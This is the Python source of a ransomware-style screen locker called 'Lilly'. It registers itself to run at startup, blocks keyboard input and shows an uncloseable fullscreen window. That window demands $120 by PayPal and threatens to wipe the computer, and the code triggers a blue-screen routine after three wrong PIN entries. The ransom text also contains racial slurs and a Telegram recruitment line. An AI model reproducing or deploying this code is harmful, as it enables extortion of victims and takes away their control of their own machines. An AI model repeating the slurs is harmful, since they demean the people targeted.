from tkinter import *
import tkinter
import time
from tkinter import messagebox
from functools import partial
from modules import bsod, startup, uninstall
import os
import keyboard
import sys

wind = Tk()
password = "96124"
lock_text = "Lilly"
count = 3

file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])

startup(file_path)
 
def buton(arg):
	enter_pass.insert(END, arg)
def delbuton():
	enter_pass.delete(-1, END)

def tapp(key):
	pass

def check():
	global count
	if enter_pass.get() == password:
		messagebox.showinfo(f"Successfull","UNLOCKED SUCCESSFULLY")
		uninstall(wind)
	else:
		count -= 1
		if count == 0:
			messagebox.showwarning("Lilly","number of attempts expired")
			bsod()
		else:
			
			messagebox.showwarning("Lilly","Wrong password. Avalible tries: "+ str(count))

def exiting():
	messagebox.showwarning("Lilly","Lilly will wipe your pc in 30mins")
wind.title("Lilly")
wind["bg"] = "black"
UNTEXD = Label(wind,bg="black", fg="magenta", padx=10, pady=10, text="\nWINDOWS LOCKED BY Lilly\n\n\n", font="helvetica 40").pack()
untex = Label(wind,bg="black", fg="magenta",text=lock_text, font="helvetica 40")
untex.place(x=210, y=170)
heading = 'Announcement'
announcement = Label(wind, bg='black', fg='magenta', font='helvetica 25 bold', text=heading).place(x=50, y=290)

note = '''Ooops Retard You executed a stealer
developed By Veal unlucky nigger
join the telegram if your able to
https://t.me/'''

T =Text(wind, height=7, width=35, fg='magenta',bd=0, exportselection=0, bg='black', font='helvetica 19')
T.place(x=50, y=340)
T.insert(INSERT, note)

procedure = 'How to unlock your computer'
procedure = Label(wind, bg='black', fg='magenta', font='helvetica 25 bold', text=procedure).place(x=50, y=530)
steps = '''1. download paypal and make an acc or use someone elses
2. send me $120 To the paypal here --> [ ratclient123@gmail.com ]'''
T1 =Text(wind, height=5, width=30, fg='magenta',bd=0, exportselection=0, bg='black', font='helvetica 19')
T1.place(x=50, y=580)
T1.insert(INSERT, steps)

keyboard.on_press(tapp, suppress=True)

vertical = Frame(wind, bg='magenta', height=490, width=2)
vertical.pack()#place(x=520, y=310)


enter_pass = Entry(wind,bg="black", bd=30, fg="magenta", text="",show='•', font="helvetica 35", width=11, insertwidth=4, justify = "center")
enter_pass.place(x=715, y=290)     #pack
wind.resizable(0,0)


wind.lift()
wind.attributes('-topmost',True)

wind.after_idle(wind.attributes,'-topmost',True)
wind.attributes('-fullscreen', True)
wind.protocol("WM_DELETE_WINDOW", exiting)

left_value = 20
moving_value = 80

button1 = Button(wind,text="1", bg='#ff00f7', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "1")).place(x=640 + moving_value, y=450)
button2 = Button(wind,text="2", bg='#ff00f7', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "2")).place(x=790 + 50, y=450)
button3 = Button(wind,text="3", bg='#ff00f7', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "3")).place(x=940 + left_value, y=450)
button4 = Button(wind,text="4", bg='#ff00f7', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "4")).place(x=640 + moving_value, y=540)
button5 = Button(wind,text="5", bg='#ff00f7', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "5")).place(x=790 + 50, y=540)
button6 = Button(wind,text="6", bg='#ff00f7', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "6")).place(x=940 + left_value, y=540)
button7 = Button(wind,text="7", bg='#ff00f7', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "7")).place(x=760 + moving_value, y=630)
button8 = Button(wind,text="8", bg='#ff00f7', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "8")).place(x=670 + 50, y=630)
button9 = Button(wind,text="9", bg='#ff00f7', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "9")).place(x=940 + left_value, y=630)
button0 = Button(wind,text="0", bg='#ff00f7', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=partial(buton, "0")).place(x=790 + 50, y=720)
delbutton = Button(wind,text="Delete", bg='#ff00f7', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=delbuton).place(x=640 + moving_value, y=720)
button = Button(wind,text="Unlock", bg='#ff00f7', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'),   command=check).place(x=940 + left_value, y=720)

wind.mainloop()
